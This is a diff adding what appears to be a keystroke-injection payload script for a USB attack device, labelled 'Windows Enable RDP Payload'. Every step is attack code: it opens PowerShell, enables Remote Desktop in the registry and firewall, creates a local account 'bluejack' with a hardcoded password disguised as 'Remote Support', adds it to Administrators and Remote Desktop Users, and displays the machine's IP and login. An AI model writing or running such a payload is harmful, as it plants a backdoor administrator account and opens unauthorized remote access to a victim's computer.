@@ -1,0 +1,32 @@
+REM Windows Enable RDP Payload
+REM Enables Remote Desktop and adds firewall rule
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+STRING Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
+ENTER
+DELAY 500
+STRING Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+ENTER
+DELAY 500
+STRING New-LocalUser -Name "bluejack" -Password (ConvertTo-SecureString "BlueJack2024!" -AsPlainText -Force) -FullName "BlueJack User" -Description "Remote Support"
+ENTER
+DELAY 500
+STRING Add-LocalGroupMember -Group "Administrators" -Member "bluejack"
+ENTER
+DELAY 500
+STRING Add-LocalGroupMember -Group "Remote Desktop Users" -Member "bluejack"
+ENTER
+DELAY 500
+STRING Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notlike "127.*"} | Select-Object IPAddress
+ENTER
+DELAY 2000
+REM Show IP address
+STRING Write-Host "RDP Enabled - Connect using credentials: bluejack / BlueJack2024!"
+ENTER
+DELAY 2000
+STRING exit
+ENTER
